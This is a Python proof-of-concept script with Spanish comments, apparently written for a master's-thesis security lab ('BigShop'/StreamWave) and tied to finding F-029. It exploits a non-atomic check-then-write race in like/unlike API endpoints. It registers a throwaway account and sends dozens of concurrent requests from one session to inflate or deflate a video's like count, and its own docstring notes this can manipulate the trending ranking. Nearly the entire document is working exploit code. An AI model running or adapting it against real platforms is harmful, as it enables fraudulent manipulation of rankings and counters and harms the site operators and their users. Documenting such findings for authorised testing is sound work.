#!/usr/bin/env python3
"""
PoC de condicion de carrera en los contadores de "like" de StreamWave
(BigShop / TFM). Ver Hallazgos/F-029 - Condicion de carrera en likes.

Contexto:
  - POST /api/videos/{id}/like  y  POST /api/videos/{id}/unlike  comprueban
    si la sesion actual ya ha dado like antes de incrementar/decrementar el
    contador ("already":true si ya estaba en ese estado).
  - Esa comprobacion ("¿ya dio like este usuario?") y la escritura
    (incrementar el contador + marcar como dado) no son atomicas: si se
    disparan muchas peticiones concurrentes con la MISMA sesion, varias
    pasan la comprobacion antes de que ninguna haya terminado de escribir
    -> el contador se incrementa (o decrementa) varias veces por una sola
    accion real de un solo usuario.
  - /trending ordena el catalogo literalmente por numero de likes, asi que
    esto permite manipular el ranking de contenido destacado con una sola
    cuenta y sin necesitar multiples usuarios ni bots.

Que hace este script:
  1. Se autentica (registra una cuenta descartable, o reutiliza --cookie).
  2. Pone el video en estado "no dado like" (llama a /unlike primero).
  3. Dispara N peticiones POST /like concurrentes con la misma sesion.
  4. Compara el incremento esperado (+1, como mucho) contra el incremento
     real observado, para cuantificar la condicion de carrera.
  5. Repite lo mismo en sentido contrario (unlike) para confirmar que es
     bidireccional (tambien se puede desinflar el contador de cualquiera).

Uso:
    python3 streamwave_like_race_condition.py --video-id xyk104
    python3 streamwave_like_race_condition.py --video-id xyk104 --requests 100
    python3 streamwave_like_race_condition.py --video-id xyk104 --cookie "connect.sid=s%3A...."

Solo para uso en el laboratorio controlado BigShop (TFM), con autorizacion.
No usar contra sistemas sin autorizacion explicita.
"""

import argparse
import concurrent.futures
import http.cookiejar
import json
import random
import re
import string
import sys
import time
import urllib.error
import urllib.request

DEFAULT_BASE_URL = "http://172.17.0.2:9090"
TIMEOUT = 8

LIKE_COUNT_RE = re.compile(r'id="likeCount">(\d+)')


def random_username():
    return "race_poc_" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))


def login(base_url: str) -> http.cookiejar.CookieJar:
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    username = random_username()
    data = f"display_name=Race+PoC&username={username}&password=TestPass123!".encode()
    req = urllib.request.Request(
        f"{base_url}/register", data=data,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        method="POST",
    )
    with opener.open(req, timeout=TIMEOUT) as resp:
        resp.read()
    if not any(c.name == "connect.sid" for c in jar):
        print("[!] No se obtuvo cookie de sesion tras el registro.")
        sys.exit(1)
    print(f"[*] Sesion obtenida con cuenta descartable '{username}'.")
    return jar


def cookiejar_from_value(value: str) -> http.cookiejar.CookieJar:
    jar = http.cookiejar.CookieJar()
    c = http.cookiejar.Cookie(
        version=0, name="connect.sid", value=value,
        port=None, port_specified=False, domain="172.17.0.2", domain_specified=False,
        domain_initial_dot=False, path="/", path_specified=True, secure=False,
        expires=None, discard=True, comment=None, comment_url=None, rest={},
    )
    jar.set_cookie(c)
    return jar


def call(opener, base_url: str, video_id: str, action: str) -> dict:
    req = urllib.request.Request(
        f"{base_url}/api/videos/{video_id}/{action}", data=b"", method="POST"
    )
    try:
        with opener.open(req, timeout=TIMEOUT) as resp:
            return json.loads(resp.read().decode("utf-8", errors="replace"))
    except urllib.error.HTTPError as e:
        try:
            return json.loads(e.read().decode("utf-8", errors="replace"))
        except Exception:
            return {"error": f"HTTP {e.code}"}
    except Exception as e:
        return {"error": str(e)}


def read_like_count(opener, base_url: str, video_id: str):
    req = urllib.request.Request(f"{base_url}/watch/{video_id}", method="GET")
    with opener.open(req, timeout=TIMEOUT) as resp:
        body = resp.read().decode("utf-8", errors="replace")
    m = LIKE_COUNT_RE.search(body)
    return int(m.group(1)) if m else None


def race(opener, base_url: str, video_id: str, action: str, n_requests: int, threads: int):
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
        futures = [ex.submit(call, opener, base_url, video_id, action) for _ in range(n_requests)]
        results = [f.result() for f in futures]
    return results


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--base-url", default=DEFAULT_BASE_URL)
    ap.add_argument("--video-id", required=True, help="ID del video a usar para la PoC (ej. xyk104)")
    ap.add_argument("--requests", type=int, default=50, help="Peticiones concurrentes a disparar por rafaga")
    ap.add_argument("--threads", type=int, default=50)
    ap.add_argument("--cookie", default=None, help="Valor de 'connect.sid' ya autenticado")
    ap.add_argument("--skip-unlike-test", action="store_true",
                     help="No probar tambien la direccion unlike (solo like)")
    args = ap.parse_args()

    jar = cookiejar_from_value(args.cookie) if args.cookie else login(args.base_url)
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

    print(f"\n[*] Reseteando '{args.video_id}' a estado 'no dado like'...")
    call(opener, args.base_url, args.video_id, "unlike")
    baseline = read_like_count(opener, args.base_url, args.video_id)
    print(f"[*] Likes antes de la rafaga: {baseline}")

    print(f"\n[*] Disparando {args.requests} peticiones POST /like concurrentes "
          f"con UNA SOLA sesion...")
    t0 = time.time()
    race(opener, args.base_url, args.video_id, "like", args.requests, args.threads)
    elapsed = time.time() - t0

    final_like = read_like_count(opener, args.base_url, args.video_id)
    delta_like = final_like - baseline

    print(f"\n{'='*70}")
    print(f"LIKE -- {args.requests} peticiones concurrentes en {elapsed:.2f}s")
    print(f"  Antes:              {baseline}")
    print(f"  Despues:            {final_like}")
    print(f"  Incremento real:    +{delta_like}")
    print(f"  Incremento esperado (logica correcta): +1 (es la misma cuenta, el mismo 'me gusta')")
    if delta_like > 1:
        print(f"  *** CONDICION DE CARRERA CONFIRMADA: +{delta_like - 1} de mas ***")
    else:
        print(f"  Sin condicion de carrera detectada en esta rafaga (puede depender de timing/carga).")
    print("=" * 70)

    if args.skip_unlike_test:
        return

    print(f"\n[*] Repitiendo en sentido contrario: {args.requests} peticiones POST /unlike "
          f"concurrentes, partiendo de 'dado like'...")
    baseline2 = final_like
    race(opener, args.base_url, args.video_id, "unlike", args.requests, args.threads)
    final_unlike = read_like_count(opener, args.base_url, args.video_id)
    delta_unlike = baseline2 - final_unlike

    print(f"\n{'='*70}")
    print(f"UNLIKE -- {args.requests} peticiones concurrentes")
    print(f"  Antes:              {baseline2}")
    print(f"  Despues:            {final_unlike}")
    print(f"  Decremento real:    -{delta_unlike}")
    print(f"  Decremento esperado (logica correcta): -1")
    if delta_unlike > 1:
        print(f"  *** CONDICION DE CARRERA CONFIRMADA (bidireccional): -{delta_unlike - 1} de mas ***")
    print("=" * 70)


if __name__ == "__main__":
    main()
